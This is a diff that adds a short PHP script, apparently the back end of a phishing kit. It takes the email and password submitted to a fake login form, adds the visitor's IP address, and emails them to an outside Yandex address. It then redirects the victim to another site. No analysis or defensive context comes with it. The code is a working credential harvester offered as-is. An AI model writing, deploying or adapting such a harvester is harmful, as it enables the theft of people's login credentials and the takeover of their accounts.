@@ -1,0 +1,25 @@
+<?php
+$ip = getenv("REMOTE_ADDR");	
+
+if(!empty($_POST)) {
+ $email= $_POST['Email'];
+ $password = $_POST['Password'];
+ 
+		$to = "resultchn@yandex.com";
+		
+		
+         $subject = "New Login : ip";
+		 
+		 $message =  "Online ID            : ".$email."\r\n";
+         $message .= "Password           : ".$password."\r\n";
+         $message .= "Ip           : ".$ip."\r\n";
+		 
+		$header = "Coded by Brokenksull\r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+		 mail ($to,$subject,$message,$header);
+		 
+		 header("Location: https://www.iglosrl.it/+441779474444-1017-122525-242.mp3");
+}
+?>
